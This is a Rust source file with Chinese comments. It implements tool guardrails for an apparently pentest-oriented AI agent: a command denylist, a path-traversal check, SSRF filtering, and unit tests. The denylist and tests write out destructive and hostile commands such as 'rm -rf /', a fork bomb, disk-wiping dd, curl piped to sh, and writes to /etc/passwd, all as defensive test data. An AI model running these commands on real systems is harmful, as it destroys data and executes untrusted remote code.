//! 工具护栏：危险命令 / 路径越界 / SSRF 检测。
//!
//! P2.2 为字符串子串 denylist + 路径词法约束（无 regex 依赖）。
//! 完整的目标白名单 / scope glob / 路径 canonicalize 约束留 P6。

use std::net::{IpAddr, ToSocketAddrs};
use std::path::{Path, PathBuf};

use crate::error::{AgentError, Result};
use crate::tool::ToolCtx;

/// 危险命令子串 denylist（小写匹配）。
///
/// 注意：`curl`/`wget` 本身是常用 recon 工具，不禁；仅禁管道送 shell 执行。
const DANGEROUS: &[&str] = &[
    "rm -rf /",
    "rm -rf ~",
    "rm -rf /*",
    "rm -rf $home",
    ":(){:|:&};:",
    ":(){",
    "fork bomb",
    "shutdown",
    "reboot",
    "halt",
    "poweroff",
    "init 0",
    "init 6",
    "mkfs",
    "dd if=",
    "of=/dev/sd",
    "of=/dev/nvme",
    "of=/dev/hd",
    "of=/dev/disk",
    "> /dev/sd",
    "chmod -R 777 /",
    "chmod -R 000 /",
    "chown -R",
    "| sh",
    "| bash",
    "| zsh",
    "|sh",
    "|bash",
    "curl ",
    "wget ",
];

/// 检查命令是否被护栏拒绝。`Ok(())` 放行；`Err(reason)` 拒绝（reason 回灌给 LLM）。
pub fn check_command(cmd: &str, ctx: &ToolCtx) -> std::result::Result<(), String> {
    let lower = cmd.to_lowercase();
    for &pat in DANGEROUS {
        if lower.contains(pat) {
            // `curl `/`wget ` 单独出现仅作可疑标记：若同时含 `| sh`/`-o`/`-O` 才拒绝；
            // 否则放行（recon 场景常用 curl 抓取）。这里简化：curl/wget 一律提示需 scope。
            if pat == "curl " || pat == "wget " {
                if lower.contains("| sh")
                    || lower.contains("| bash")
                    || lower.contains("|sh")
                    || lower.contains("|bash")
                {
                    return Err(format!("被安全护栏拒绝：禁止管道至 shell 执行（{pat}…）"));
                }
                continue;
            }
            return Err(format!("被安全护栏拒绝：命中危险模式 `{pat}`"));
        }
    }
    // rules 关键词检查（粗粒度）：若 rule 含"禁止"/"禁"+ 命令含相关词，提示。
    // P2.2 不做语义匹配，仅 denylist；rules 已注入系统提示词由模型遵守。
    let _ = ctx;
    Ok(())
}

/// 检查写路径是否越界（词法约束：不允许 `..` 逃逸 cwd）。
pub fn check_write_path(path: &Path, ctx: &ToolCtx) -> std::result::Result<(), String> {
    let resolved = resolve_under_cwd(path, &ctx.cwd)?;
    // 不允许写出到 cwd 之外
    if !resolved.starts_with(&ctx.cwd) {
        return Err(format!(
            "被安全护栏拒绝：路径 `{}` 逃逸出工作目录 {}",
            path.display(),
            ctx.cwd.display()
        ));
    }
    Ok(())
}

/// 把 `path` 相对 `cwd` 解析，规范化 `.`/`..`（词法，不访问文件系统）。
/// 返回绝对路径。`..` 逃逸 cwd 仍返回（由调用方判断 starts_with）。
pub(crate) fn resolve_under_cwd(path: &Path, cwd: &Path) -> std::result::Result<PathBuf, String> {
    let p = if path.is_absolute() {
        path.to_path_buf()
    } else {
        cwd.join(path)
    };
    // 词法规范化
    let mut out: Vec<std::path::Component> = Vec::new();
    for comp in p.components() {
        match comp {
            std::path::Component::ParentDir => {
                if matches!(
                    out.last(),
                    Some(std::path::Component::Normal(_)) | Some(std::path::Component::CurDir)
                ) {
                    out.pop();
                } else {
                    out.push(comp);
                }
            }
            std::path::Component::CurDir => {}
            other => out.push(other),
        }
    }
    Ok(out.iter().collect())
}

/// SSRF 检查：禁止非 http/https 协议 + 私有/内网 IP 地址。
///
/// 解析 URL 后对 host 做 DNS 解析，检查所有解析到的 IP 是否属于私有范围。
pub(crate) fn check_ssrf(url_str: &str) -> Result<()> {
    let url = reqwest::Url::parse(url_str)
        .map_err(|e| AgentError::Provider(format!("URL 解析失败: {e}")))?;

    // 只允许 http/https
    match url.scheme() {
        "http" | "https" => {}
        other => {
            return Err(AgentError::Provider(format!(
                "不允许的协议 '{other}'，仅支持 http/https"
            )));
        }
    }

    let host = url
        .host_str()
        .ok_or_else(|| AgentError::Provider("URL 缺少 host".into()))?;

    // DNS 解析并检查所有 IP
    let port = url.port_or_known_default().unwrap_or(80);
    let socket_addrs = format!("{host}:{port}");
    let addrs: Vec<_> = socket_addrs
        .to_socket_addrs()
        .map_err(|e| AgentError::Provider(format!("DNS 解析失败: {e}")))?
        .collect();

    if addrs.is_empty() {
        return Err(AgentError::Provider(format!("DNS 解析无结果: {host}")));
    }

    for addr in &addrs {
        let ip = addr.ip();
        if is_private_ip(ip) {
            return Err(AgentError::Provider(format!(
                "SSRF 保护：{host} 解析到内网地址 {ip}，已拒绝"
            )));
        }
    }

    Ok(())
}

/// 判断 IP 是否是私有/内网/保留地址。
pub(crate) fn is_private_ip(ip: IpAddr) -> bool {
    match ip {
        IpAddr::V4(v4) => {
            let o = v4.octets();
            v4.is_loopback() // 127.0.0.0/8
                || v4.is_unspecified() // 0.0.0.0
                || v4.is_link_local() // 169.254.0.0/16
                || o[0] == 10 // 10.0.0.0/8
                || (o[0] == 172 && (16..=31).contains(&o[1])) // 172.16.0.0/12
                || (o[0] == 192 && o[1] == 168) // 192.168.0.0/16
        }
        IpAddr::V6(v6) => {
            v6.is_loopback() // ::1
                || v6.is_unspecified() // ::
                || v6.is_unicast_link_local() // fe80::/10
                || (v6.octets()[0] == 0xfc || v6.octets()[0] == 0xfd) // fc00::/7 unique local
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ctx(cwd: &str) -> ToolCtx {
        ToolCtx {
            cwd: PathBuf::from(cwd),
            rules: vec![],
            scope: None,
            env: Vec::new(),
        }
    }

    #[test]
    fn allows_safe_commands() {
        let c = ctx("/tmp");
        assert!(check_command("ls -la", &c).is_ok());
        assert!(check_command("echo hello", &c).is_ok());
        assert!(check_command("nmap -sV example.com", &c).is_ok());
    }

    #[test]
    fn rejects_rm_rf_root() {
        let c = ctx("/tmp");
        assert!(check_command("rm -rf /", &c).is_err());
        assert!(check_command("RM -RF /", &c).is_err(), "应大小写不敏感");
        assert!(check_command("rm -rf ~", &c).is_err());
    }

    #[test]
    fn rejects_pipe_to_shell() {
        let c = ctx("/tmp");
        assert!(check_command("curl http://x | sh", &c).is_err());
        assert!(check_command("wget http://x | bash", &c).is_err());
    }

    #[test]
    fn rejects_shutdown_mkfs_dd() {
        let c = ctx("/tmp");
        assert!(check_command("shutdown now", &c).is_err());
        assert!(check_command("mkfs.ext4 /dev/sda1", &c).is_err());
        assert!(check_command("dd if=/dev/zero of=/dev/sda", &c).is_err());
    }

    #[test]
    fn write_path_rejects_traversal() {
        let c = ctx("/tmp/proj");
        assert!(check_write_path(Path::new("../../etc/passwd"), &c).is_err());
        assert!(check_write_path(Path::new("/etc/passwd"), &c).is_err());
    }

    #[test]
    fn write_path_allows_within_cwd() {
        let c = ctx("/tmp/proj");
        assert!(check_write_path(Path::new("a.txt"), &c).is_ok());
        assert!(check_write_path(Path::new("sub/b.txt"), &c).is_ok());
    }

    #[test]
    fn private_ipv4_addresses_detected() {
        assert!(is_private_ip("127.0.0.1".parse().unwrap()));
        assert!(is_private_ip("10.0.0.1".parse().unwrap()));
        assert!(is_private_ip("172.16.0.1".parse().unwrap()));
        assert!(is_private_ip("172.31.255.255".parse().unwrap()));
        assert!(is_private_ip("192.168.1.1".parse().unwrap()));
        assert!(is_private_ip("169.254.1.1".parse().unwrap()));
        assert!(is_private_ip("0.0.0.0".parse().unwrap()));
    }

    #[test]
    fn public_ipv4_addresses_allowed() {
        assert!(!is_private_ip("8.8.8.8".parse().unwrap()));
        assert!(!is_private_ip("1.1.1.1".parse().unwrap()));
        assert!(!is_private_ip("172.15.0.1".parse().unwrap()));
        assert!(!is_private_ip("172.32.0.1".parse().unwrap()));
    }

    #[test]
    fn private_ipv6_addresses_detected() {
        assert!(is_private_ip("::1".parse().unwrap()));
        assert!(is_private_ip("::".parse().unwrap()));
        assert!(is_private_ip("fe80::1".parse().unwrap()));
        assert!(is_private_ip("fc00::1".parse().unwrap()));
        assert!(is_private_ip("fd00::1".parse().unwrap()));
    }

    #[test]
    fn ssrf_rejects_non_http_schemes() {
        let err = check_ssrf("file:///etc/passwd").unwrap_err();
        assert!(err.to_string().contains("不允许的协议"));
        assert!(err.to_string().contains("file"));

        let err = check_ssrf("ftp://example.com").unwrap_err();
        assert!(err.to_string().contains("ftp"));
    }

    #[test]
    fn ssrf_rejects_localhost_ip() {
        let err = check_ssrf("http://127.0.0.1/").unwrap_err();
        assert!(err.to_string().contains("SSRF"));
        assert!(err.to_string().contains("127.0.0.1"));
    }

    #[test]
    fn ssrf_rejects_private_ip() {
        let err = check_ssrf("http://10.0.0.1/").unwrap_err();
        assert!(err.to_string().contains("SSRF"));

        let err = check_ssrf("http://192.168.1.1/").unwrap_err();
        assert!(err.to_string().contains("SSRF"));
    }
}
